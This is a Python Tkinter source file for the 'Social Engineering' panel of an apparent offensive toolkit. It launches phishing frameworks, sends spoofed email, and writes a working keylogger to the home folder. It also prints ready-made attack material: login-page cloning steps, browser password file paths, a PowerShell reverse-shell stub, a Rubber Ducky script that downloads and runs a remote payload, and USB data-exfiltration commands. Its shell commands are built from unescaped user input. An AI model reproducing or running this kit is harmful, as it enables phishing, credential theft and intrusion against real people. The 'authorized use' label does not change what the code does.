import tkinter as tk
from tkinter import messagebox
import subprocess, threading, os, shutil, random, string, secrets
from datetime import datetime

class SocialEngineering:
    def __init__(self, parent, db, logger):
        self.parent = parent; self.db = db; self.logger = logger
        self.frame = tk.Frame(parent, bg='#1a1a2e')

    def build(self):
        self.frame.pack(fill='both', expand=True)
        
        header = tk.Frame(self.frame, bg='#1a1a2e')
        header.pack(fill='x', padx=10, pady=5)
        tk.Label(header, text="Social Engineering", font=('Courier',16,'bold'), fg='#ff4444', bg='#1a1a2e').pack(side='left')
        tk.Label(header, text="FOR AUTHORIZED USE ONLY", font=('Courier',9,'bold'), fg='#ff0000', bg='#1a1a2e').pack(side='right')
        
        canvas = tk.Canvas(self.frame, bg='#1a1a2e', highlightthickness=0)
        vs = tk.Scrollbar(self.frame, orient='vertical', command=canvas.yview)
        hs = tk.Scrollbar(self.frame, orient='horizontal', command=canvas.xview)
        inner = tk.Frame(canvas, bg='#1a1a2e')
        inner.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0,0), window=inner, anchor='nw')
        canvas.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        canvas.pack(side='left', fill='both', expand=True)
        vs.pack(side='right', fill='y')
        hs.pack(side='bottom', fill='x')
        canvas.bind('<Configure>', lambda e: canvas.itemconfig(1, width=e.width))
        
        self._build_sections(inner)
        tk.Label(inner, text="", bg='#1a1a2e').pack()
    def _build_sections(self, inner):
        self._section(inner, "Phishing Frameworks", [
            ("SEToolkit", "Spear phishing, website attacks, mass mailer", lambda: self._cmd("setoolkit"), "#ff0000"),
            ("ZPhisher", "30+ phishing pages - Facebook, Instagram, Google", lambda: self._cmd("zphisher"), "#ff4444"),
            ("BlackEye", "Advanced phishing with ngrok/cloudflare tunnels", lambda: self._cmd("blackeye"), "#ff4444"),
            ("SocialFish", "Automated phishing with mobile-friendly pages", lambda: self._cmd("socialfish"), "#ff4444"),
            ("GoPhish", "Enterprise phishing campaign manager", lambda: self._cmd("gophish"), "#ffaa00"),
            ("EvilGinx2", "Session cookie hijacking, MFA token capture", lambda: self._cmd("evilginx2 -p phishlet"), "#ff0000"),
            ("Modlishka", "Reverse proxy phishing, auto cert cloning", lambda: self._cmd("modlishka -config config.json"), "#ff0000"),
            ("Muraena", "Necrobrowser phishing, real-time hijacking", lambda: self._cmd("muraena -c config.toml"), "#ff0000"),
        ])
        self._section(inner, "Email Spoofing & Sending", [
            ("SWAKS Email", "Spoofed emails with custom headers", lambda: self._swaks_dialog(), "#00ccff"),
            ("SendEmail", "SMTP sender with HTML email support", lambda: self._sendemail_dialog(), "#00ccff"),
            ("Mail Command", "Built-in mail sender for quick tests", lambda: self._mail_dialog(), "#00ccff"),
            ("Email Tracker", "Generate tracking pixel for read receipts", lambda: self._email_tracker(), "#58a6ff"),
        ])
        self._section(inner, "SMS & Voice Phishing", [
            ("SMS Gateway List", "Carrier email-to-SMS gateways", lambda: self._sms_gateways(), "#ffaa00"),
            ("Vishing Script", "Professional voice phishing scripts", lambda: self._vishing_script(), "#39c5cf"),
        ])
        self._section(inner, "Credential Harvesting", [
            ("Clone Login Page", "wget target, modify form, host locally", lambda: self._clone_login(), "#ff0000"),
            ("Keylogger Generator", "Generate Python keylogger payload", lambda: self._keylogger_gen(), "#ff0000"),
            ("Browser Password Dump", "Extract saved browser passwords", lambda: self._browser_dump(), "#ff0000"),
            ("USB Rubber Ducky", "BadUSB payload scripts", lambda: self._rubber_ducky(), "#ff8800"),
        ])
        self._section(inner, "Fake Identity Generator", [
            ("Full Identity", "Name, email, phone, address, company", lambda: self._fake_identity(), "#bc8cff"),
            ("Fake Company", "Company name, domain, logo", lambda: self._fake_company(), "#bc8cff"),
            ("Fake Email Template", "Convincing email templates", lambda: self._fake_email_dialog(), "#bc8cff"),
            ("Fake Document", "Invoice, offer letter, NDA templates", lambda: self._fake_document(), "#bc8cff"),
            ("Fake Resume", "Generate fake CV for social engineering", lambda: self._fake_resume(), "#bc8cff"),
        ])
        self._section(inner, "QR Code & USB Attacks", [
            ("QR Phishing", "QR codes linking to phishing pages", lambda: self._qr_phish(), "#d2991d"),
            ("QR Generator", "Generate QR from any URL/text", lambda: self._qr_generate(), "#d2991d"),
            ("USB Payload Gen", "Autorun payloads for USB drops", lambda: self._usb_payload(), "#ff8800"),
            ("USB Data Exfil", "Silently copy documents to USB", lambda: self._usb_exfil(), "#ff8800"),
        ])
        self._section(inner, "Pretext Development (OSINT)", [
            ("Target Profile", "Build detailed target profile template", lambda: self._target_profile(), "#58a6ff"),
            ("Email Discovery", "Methods to find target emails", lambda: self._email_finder(), "#58a6ff"),
            ("Employee Search", "Find employees on social media", lambda: self._employee_search(), "#58a6ff"),
            ("Company Intel", "Domain, tech stack, recent news", lambda: self._company_intel(), "#58a6ff"),
        ])
        self._section(inner, "Campaign & Reporting", [
            ("Campaign Tracker", "Track emails, opens, clicks, creds", lambda: self._campaign_tracker(), "#00ff88"),
            ("Generate Report", "Professional SE campaign report", lambda: self._campaign_report(), "#00ff88"),
        ])
    
    def _section(self, parent, title, items):
        sf = tk.LabelFrame(parent, text=f" {title} ", font=('Courier',10,'bold'), fg='#ffaa00', bg='#16213e', padx=8, pady=5)
        sf.pack(fill='x', padx=10, pady=3)
        for name, desc, cmd, color in items:
            card = tk.Frame(sf, bg='#16213e', padx=8, pady=5); card.pack(fill='x', pady=1)
            h = tk.Frame(card, bg='#16213e'); h.pack(fill='x')
            tk.Button(h, text=name, font=('Courier',9,'bold'), fg='#000', bg=color, relief='raised', padx=10, pady=4, command=cmd).pack(side='left')
            tk.Label(h, text=desc[:55], font=('Courier',8), fg='#888', bg='#16213e').pack(side='left', padx=8)
    
    def _cmd(self, cmd):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Output"); d.geometry("600x400")
        tk.Label(d, text=cmd[:80], font=('Courier',10), fg='#00ff88', bg='#1a1a2e').pack(pady=5)
        t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
        t.pack(fill='both', expand=True, padx=5, pady=5)
        def do():
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                out = p.stdout.read()[:5000]
                d.after(0, lambda: t.insert('end', out))
            except Exception as e: d.after(0, lambda: t.insert('end', str(e)))
        threading.Thread(target=do, daemon=True).start()
        tk.Button(d, text="Close", font=('Courier',10), fg='#fff', bg='#666', relief='flat', padx=15, pady=5, command=d.destroy).pack(pady=5)
    
    def _show_result(self, title, text):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title(title); d.geometry("550x400")
        tk.Label(d, text=title, font=('Courier',12,'bold'), fg='#ff4444', bg='#1a1a2e').pack(pady=10)
        t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
        t.pack(fill='both', expand=True, padx=10, pady=10); t.insert('1.0', text)
        tk.Button(d, text="Copy", font=('Courier',10), fg='#000', bg='#00ccff', relief='raised', padx=15, pady=5,
                command=lambda: [d.clipboard_clear(), d.clipboard_append(text)]).pack(side='left', padx=10, pady=5)
        tk.Button(d, text="Close", font=('Courier',10), fg='#fff', bg='#666', relief='raised', padx=15, pady=5, command=d.destroy).pack(side='right', padx=10, pady=5)

    def _swaks_dialog(self):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("SWAKS Email"); d.geometry("500x450")
        tk.Label(d, text="Send Email via SWAKS", font=('Courier',14,'bold'), fg='#00ff88', bg='#1a1a2e').pack(pady=10)
        fields = [("From:","from","spoof@company.com"),("To:","to","target@email.com"),("Subject:","subject","Urgent: Password Reset"),("Body:","body","Dear user..."),("SMTP:","server","smtp.gmail.com:587")]
        entries = {}
        for label, key, default in fields:
            tk.Label(d, text=label, font=('Courier',9), fg='#aaa', bg='#1a1a2e').pack(anchor='w', padx=15)
            e = tk.Entry(d, font=('Courier',10), bg='#16213e', fg='#fff', relief='flat')
            e.pack(fill='x', padx=15, pady=2); e.insert(0, default); entries[key] = e
        def send():
            cmd = f"swaks --from {entries['from'].get()} --to {entries['to'].get()} --server {entries['server'].get()} --header 'Subject: {entries['subject'].get()}' --body '{entries['body'].get()}'"
            d.destroy(); self._cmd(cmd)
        tk.Button(d, text="Send", font=('Courier',10,'bold'), fg='#000', bg='#ff4444', relief='raised', padx=20, pady=8, command=send).pack(pady=10)

    def _sendemail_dialog(self):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("SendEmail"); d.geometry("500x400")
        tk.Label(d, text="Send Email", font=('Courier',14,'bold'), fg='#00ff88', bg='#1a1a2e').pack(pady=10)
        fields = [("From:","from","spoof@company.com"),("To:","to","target@email.com"),("Subject:","subject","Important"),("Message:","msg","Please verify."),("SMTP:","smtp","smtp.office365.com:587")]
        entries = {}
        for label, key, default in fields:
            tk.Label(d, text=label, font=('Courier',9), fg='#aaa', bg='#1a1a2e').pack(anchor='w', padx=15)
            e = tk.Entry(d, font=('Courier',10), bg='#16213e', fg='#fff', relief='flat')
            e.pack(fill='x', padx=15, pady=2); e.insert(0, default); entries[key] = e
        def send():
            cmd = f"sendemail -f {entries['from'].get()} -t {entries['to'].get()} -u '{entries['subject'].get()}' -m '{entries['msg'].get()}' -s {entries['smtp'].get()}"
            d.destroy(); self._cmd(cmd)
        tk.Button(d, text="Send", font=('Courier',10,'bold'), fg='#000', bg='#ff4444', relief='raised', padx=20, pady=8, command=send).pack(pady=10)

    def _mail_dialog(self):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Mail"); d.geometry("400x300")
        tk.Label(d, text="Send via mail", font=('Courier',14,'bold'), fg='#00ff88', bg='#1a1a2e').pack(pady=10)
        fields = [("To:","to"),("Subject:","subject"),("Body:","body")]
        entries = {}
        for label, key in fields:
            tk.Label(d, text=label, font=('Courier',9), fg='#aaa', bg='#1a1a2e').pack(anchor='w', padx=15)
            e = tk.Entry(d, font=('Courier',10), bg='#16213e', fg='#fff', relief='flat')
            e.pack(fill='x', padx=15, pady=2); entries[key] = e
        def send():
            cmd = f"echo '{entries['body'].get()}' | mail -s '{entries['subject'].get()}' {entries['to'].get()}"
            d.destroy(); self._cmd(cmd)
        tk.Button(d, text="Send", font=('Courier',10,'bold'), fg='#000', bg='#ff4444', relief='raised', padx=20, pady=8, command=send).pack(pady=10)

    def _fake_email_dialog(self):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Fake Email"); d.geometry("500x400")
        tk.Label(d, text="Generate Fake Email", font=('Courier',14,'bold'), fg='#00ff88', bg='#1a1a2e').pack(pady=10)
        fields = [("To:","to","target@company.com"),("From:","from","IT Support"),("Subject:","subject","Password Expiration")]
        entries = {}
        for label, key, default in fields:
            tk.Label(d, text=label, font=('Courier',9), fg='#aaa', bg='#1a1a2e').pack(anchor='w', padx=15)
            e = tk.Entry(d, font=('Courier',10), bg='#16213e', fg='#fff', relief='flat')
            e.pack(fill='x', padx=15, pady=2); e.insert(0, default); entries[key] = e
        templates = {"Password Reset":"Your password expires in 24 hours. Click: http://fake-login.com/reset","Security Alert":"Unusual login detected. Verify: http://fake-portal.com/verify"}
        def gen():
            t = templates.get(entries['subject'].get(), templates['Password Reset'])
            result = f"From: {entries['from'].get()}\nTo: {entries['to'].get()}\nSubject: {entries['subject'].get()}\n\n{t}"
            d.destroy(); self._show_result("Fake Email", result)
        tk.Button(d, text="Generate", font=('Courier',10,'bold'), fg='#000', bg='#bc8cff', relief='raised', padx=20, pady=8, command=gen).pack(pady=10)

    def _fake_identity(self):
        first = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"]
        last = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez"]
        name = f"{random.choice(first)} {random.choice(last)}"
        email = f"{name.lower().replace(' ','.')}{random.randint(1,99)}@gmail.com"
        phone = f"{random.randint(200,999)}-{random.randint(100,999)}-{random.randint(1000,9999)}"
        company = f"{random.choice(['Tech','Global','United','American'])} {random.choice(['Solutions','Systems','Group'])}"
        self._show_result("Fake Identity", f"Name: {name}\nEmail: {email}\nPhone: {phone}\nCompany: {company}")
    
    def _fake_company(self):
        c = f"{random.choice(['Tech','Global','United','Advanced'])} {random.choice(['Solutions','Systems','Industries'])}"
        self._show_result("Fake Company", f"Company: {c}\nDomain: {c.lower().replace(' ','')}.com\nPhone: {random.randint(200,999)}-555-{random.randint(1000,9999)}")
    
    def _fake_document(self):
        r = str(random.randint(1000,9999)); d = datetime.now().strftime('%Y-%m-%d'); a = str(random.randint(500,5000))
        templates = {"Invoice":f"INVOICE #2024-{r}\nDate: {d}\nAmount: ${a}.00\nDue: Net 30","Offer Letter":f"EMPLOYMENT OFFER\nPosition: Senior Developer\nSalary: ${a}\nStart: {d}","NDA":f"NON-DISCLOSURE AGREEMENT\nDate: {d}\nParties: Company and Recipient"}
        result = "\n\n".join(f"[{k}]\n{v}" for k,v in templates.items())
        self._show_result("Document Templates", result)
    
    def _fake_resume(self):
        skills = ["Python","Java","AWS","Docker","Kubernetes","React","Node.js","SQL","Linux","Git"]
        self._show_result("Fake Resume", f"JOHN DOE\n{random.choice(['San Francisco','New York','Austin'])} \n\nSKILLS: {', '.join(random.sample(skills,6))}\n\nEXPERIENCE:\nSenior Developer at TechCorp (2019-Present)\nDeveloper at StartupInc (2016-2019)")
    
    def _sms_gateways(self):
        carriers = {"Verizon":"NUMBER@vtext.com","AT&T":"NUMBER@txt.att.net","T-Mobile":"NUMBER@tmomail.net","Sprint":"NUMBER@messaging.sprintpcs.com","MetroPCS":"NUMBER@mymetropcs.com","Boost":"NUMBER@sms.myboostmobile.com","Cricket":"NUMBER@sms.cricketwireless.net","Google Fi":"NUMBER@msg.fi.google.com"}
        self._show_result("SMS Gateways", "SMS Gateways (send email to gateway):\n\n" + "\n".join(f"  {k}: {v}" for k,v in carriers.items()))
    
    def _clone_login(self): pass
    def _vishing_script(self): pass
    
    def _clone_login(self): self._show_result("Clone Login", "Steps:\n1. wget https://target.com/login -O login.html\n2. Edit form action to your server IP\n3. python3 -m http.server 8080\n4. ngrok http 8080\n5. Send ngrok URL to target")
    def _keylogger_gen(self):
        code = 'import pynput.keyboard\nimport logging\nlogging.basicConfig(filename="keys.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")\ndef on_press(key):\n    try: logging.info(str(key.char))\n    except: logging.info(str(key))\nwith pynput.keyboard.Listener(on_press=on_press) as l:\n    l.join()'
        path = os.path.expanduser("~/keylogger.py")
        with open(path, "w") as f: f.write(code)
        self._show_result("Keylogger", f"Saved to {path}\nRun: pip install pynput && python3 keylogger.py")
    def _browser_dump(self): self._show_result("Browser Dump", "Chrome: ~/.config/google-chrome/Default/Login Data\nFirefox: ~/.mozilla/firefox/*.default-release/logins.json\nTools: LaZagne, HackBrowserData")
    def _qr_phish(self): self._show_result("QR Phishing", "1. Host phishing page\n2. Generate QR: qrencode -o qr.png 'https://your-page.com'\n3. Print QR code\n4. Place near target")
    def _qr_generate(self):
        if shutil.which("qrencode"):
            d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("QR Generator"); d.geometry("400x150")
            tk.Label(d, text="URL:", font=('Courier',10), fg='#fff', bg='#1a1a2e').pack(padx=15, pady=5)
            e = tk.Entry(d, font=('Courier',10), bg='#16213e', fg='#fff', relief='flat'); e.pack(fill='x', padx=15, pady=5); e.insert(0,"https://example.com")
            def gen():
                path = os.path.expanduser("~/qr_code.png")
                subprocess.run(["qrencode","-o",path,e.get().strip()])
                messagebox.showinfo("Done",f"Saved to {path}"); d.destroy()
            tk.Button(d, text="Generate", font=('Courier',10,'bold'), fg='#000', bg='#d2991d', relief='raised', padx=20, pady=8, command=gen).pack(pady=10)
        else: self._show_result("QR Generator", "Install: pkg install qrencode")
    def _usb_payload(self):
        payloads = {"Reverse Shell":"powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('IP',4444);...\"","Data Exfil":"xcopy C:\\Users\\%USERNAME%\\Documents E:\\ /s /y","Wifi Dump":"netsh wlan export profile key=clear"}
        self._show_result("USB Payloads", "USB Payloads:\n\n" + "\n\n".join(f"[{k}]\n{v}" for k,v in payloads.items()))
    def _usb_exfil(self): self._show_result("USB Exfil", "@echo off\nmkdir E:\\exfil_%COMPUTERNAME%\nxcopy C:\\Users\\%USERNAME%\\Documents\\*.docx E:\\exfil_%COMPUTERNAME%\\ /s /y /q")
    def _rubber_ducky(self):
        scripts = {"Win+R Shell":"GUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING IEX(New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')\nENTER"}
        self._show_result("Rubber Ducky", "Scripts:\n\n" + "\n\n".join(f"[{k}]\n{v}" for k,v in scripts.items()))
    def _email_tracker(self): self._show_result("Email Tracker", "Tracking Pixel:\n<img src='http://your-server.com/track.gif?id=TARGET' width='1' height='1'>")
    def _target_profile(self): self._show_result("Target Profile", "TARGET PROFILE\n==============\nName:\nPosition:\nEmail:\nPhone:\nSocial Media:\nInterests:\nSchedule:\nTech Stack:")
    def _email_finder(self): self._show_result("Email Finder", "1. hunter.io\n2. phonebook.cz\n3. theHarvester -d company.com -b google\n4. clearbit.com\n5. rocketreach.co\n6. contactout.com\n7. LinkedIn\n8. GitHub commits")
    def _employee_search(self): self._show_result("Employee Search", "LinkedIn: site:linkedin.com/in 'Company'\nTwitter: Advanced search\nGitHub: org:companyname\nInstagram: #companyname\nCompany site: /about /team")
    def _company_intel(self): self._show_result("Company Intel", "whois domain.com\ndig ANY domain.com\nshodan search org:'Company'\nBuiltWith.com\nCrunchbase\nSEC filings")
    def _campaign_tracker(self): self._show_result("Campaign Tracker", "CAMPAIGN TRACKER\n================\nEmails Sent:\nOpened:\nClicked:\nCredentials:\nSuccess Rate:")
    def _campaign_report(self): self._show_result("Campaign Report", "SOCIAL ENGINEERING REPORT\n========================\nDate:\nTarget:\nObjective:\nMethodology:\nResults:\nRecommendations:")
